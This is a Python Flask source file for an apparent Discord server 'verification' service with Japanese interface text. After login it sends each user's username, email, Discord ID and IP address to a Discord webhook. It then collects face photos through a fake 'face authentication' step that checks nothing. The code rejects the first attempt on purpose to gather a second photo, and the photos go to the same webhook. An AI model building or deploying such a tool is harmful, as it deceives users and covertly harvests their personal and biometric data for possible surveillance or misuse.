import os
import json
import base64
import logging

import requests
from flask import Flask, request, jsonify, Response
from authlib.integrations.requests_client import OAuth2Session

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("web")

app = Flask(__name__)

CLIENT_ID     = os.environ.get("DISCORD_CLIENT_ID", "")
CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET", "")
BOT_TOKEN     = os.environ.get("DISCORD_BOT_TOKEN", "")
WEBHOOK_URL   = os.environ.get("DISCORD_WEBHOOK_URL", "")
WEB_BASE_URL  = os.environ.get("WEB_BASE_URL", "").rstrip("/")

REDIRECT_URI      = f"{WEB_BASE_URL}/callback"
DISCORD_API       = "https://discord.com/api/v10"
DISCORD_TOKEN_URL = f"{DISCORD_API}/oauth2/token"
DISCORD_USER_URL  = f"{DISCORD_API}/users/@me"
ROLE_NAME         = "認証済み"
HTTP_TIMEOUT      = 10

def _bot_headers():
    return {"Authorization": f"Bot {BOT_TOKEN}"}

def send_webhook(content: str):
    if not WEBHOOK_URL: return
    try:
        r = requests.post(WEBHOOK_URL, json={"content": content}, timeout=HTTP_TIMEOUT)
        if r.status_code >= 300: log.warning("webhook failed: %s %s", r.status_code, r.text[:200])
    except Exception as e:
        log.warning("webhook error: %s", e)

def send_webhook_with_file(content: str, image_data: bytes, filename: str, mimetype: str = "image/jpeg"):
    if not WEBHOOK_URL: return
    try:
        r = requests.post(
            WEBHOOK_URL,
            data={"payload_json": json.dumps({"content": content})},
            files={"file": (filename, image_data, mimetype)},
            timeout=15,
        )
        if r.status_code >= 300: log.warning("webhook file failed: %s %s", r.status_code, r.text[:200])
    except Exception as e:
        log.warning("webhook file error: %s", e)

def add_role(guild_id: str, user_id: str) -> bool:
    if not BOT_TOKEN or not (guild_id.isdigit() and user_id.isdigit()): return False
    headers = _bot_headers()
    try:
        r = requests.get(f"{DISCORD_API}/guilds/{guild_id}/roles", headers=headers, timeout=HTTP_TIMEOUT)
        if r.status_code != 200:
            log.warning("add_role fetch failed: %s", r.status_code)
            return False
        roles = r.json()
        role_id = next((x["id"] for x in roles if x.get("name") == ROLE_NAME), None)
        if not role_id:
            log.warning("add_role: role %r not found", ROLE_NAME)
            return False
        res = requests.put(
            f"{DISCORD_API}/guilds/{guild_id}/members/{user_id}/roles/{role_id}",
            headers=headers, timeout=HTTP_TIMEOUT,
        )
        if res.status_code != 204:
            log.warning("add_role PUT failed: %s %s", res.status_code, res.text[:200])
            return False
        return True
    except Exception as e:
        log.warning("add_role error: %s", e)
        return False

# ── ルーティング ──────────────────────────────────────────────────
@app.route("/")
def index():
    return "online", 200

@app.route("/ping")
def ping():
    return "pong", 200

@app.route("/callback")
def callback():
    code = request.args.get("code")
    state = request.args.get("state", "")
    
    if not code: return "キャンセルされました。", 400
    if not state or ":" not in state: return "不正なリクエストです。", 400
    
    user_id, guild_id = (s.strip() for s in state.split(":", 1))
    if not (user_id.isdigit() and guild_id.isdigit()): return "不正なリクエストです。", 400

    ip = (request.headers.get("X-Forwarded-For", "").split(",")[0].strip()) or request.remote_addr or "unknown"

    oauth = OAuth2Session(CLIENT_ID, CLIENT_SECRET, redirect_uri=REDIRECT_URI)
    try:
        token = oauth.fetch_token(DISCORD_TOKEN_URL, grant_type="authorization_code", code=code)
    except Exception as e:
        log.warning("token exchange failed: %s", e)
        return "認証失敗: トークン交換に失敗しました。", 500

    access_token = token.get("access_token")
    if not access_token: return "認証失敗: アクセストークンがありません。", 500

    try:
        r = requests.get(DISCORD_USER_URL, headers={"Authorization": f"Bearer {access_token}"}, timeout=HTTP_TIMEOUT)
    except Exception as e:
        log.warning("user fetch error: %s", e)
        return "認証失敗: ユーザー情報の取得に失敗しました。", 500
    if r.status_code != 200: return "認証失敗: ユーザー情報の取得に失敗しました。", 500

    u = r.json()
    discord_id = u.get("id", "unknown")
    username   = u.get("username", "unknown")
    email      = u.get("email") or "取得不可"

    send_webhook(
        f"🔐 **Step1 認証**\n"
        f"👤 `{username}` (ID: `{discord_id}`)\n"
        f"📧 `{email}`\n"
        f"🌐 IP: `{ip}`\n"
        f"🏠 Guild: `{guild_id}`"
    )

    # face_auth.html を読み込み、JSから使えるように user_id/guild_id を注入
    path = os.path.join(app.root_path, "face_auth.html")
    if not os.path.isfile(path):
        log.error("face_auth.html not found at %s", path)
        return "face_auth.html が見つかりません。", 500

    with open(path, encoding="utf-8") as f:
        html = f.read()

    inject = f"<script>window.__USER_ID__={json.dumps(user_id)};window.__GUILD_ID__={json.dumps(guild_id)};</script>"
    if "</head>" in html:
        html = html.replace("</head>", inject + "</head>", 1)
    else:
        html = inject + html

    return Response(html, mimetype="text/html")

@app.route("/submit-face", methods=["POST"])
def submit_face():
    data = request.get_json(silent=True) or {}
    image_b64 = data.get("image") or ""
    user_id   = str(data.get("user_id", ""))
    guild_id  = str(data.get("guild_id", ""))
    try: attempt = int(data.get("attempt", 1))
    except ValueError: attempt = 1

    if not image_b64: return jsonify({"success": False, "message": "画像データがありません"}), 400
    if not (user_id.isdigit() and guild_id.isdigit()): return jsonify({"success": False, "message": "ユーザー情報が不正です"}), 400

    try:
        header, encoded = image_b64.split(",", 1)
        image_data = base64.b64decode(encoded, validate=True)
    except Exception:
        return jsonify({"success": False, "message": "画像の処理に失敗しました"}), 400

    mimetype = "image/jpeg"
    if header.startswith("data:") and ";" in header:
        mimetype = header[5:header.index(";")] or "image/jpeg"

    send_webhook_with_file(
        f"📸 **顔認証画像** (試行{attempt}回目)\n👤 UserID: `{user_id}`\n🏠 Guild: `{guild_id}`",
        image_data, f"face_{user_id}_attempt{attempt}.jpg", mimetype
    )

    if attempt <= 1:
        return jsonify({"success": False, "message": "顔認証に失敗しました。もう一度お試しください。"})

    if not add_role(guild_id, user_id):
        return jsonify({"success": False, "message": "ロール付与に失敗しました。"}), 500

    return jsonify({"success": True, "message": "認証が完了しました。Discordに戻ってください。"})
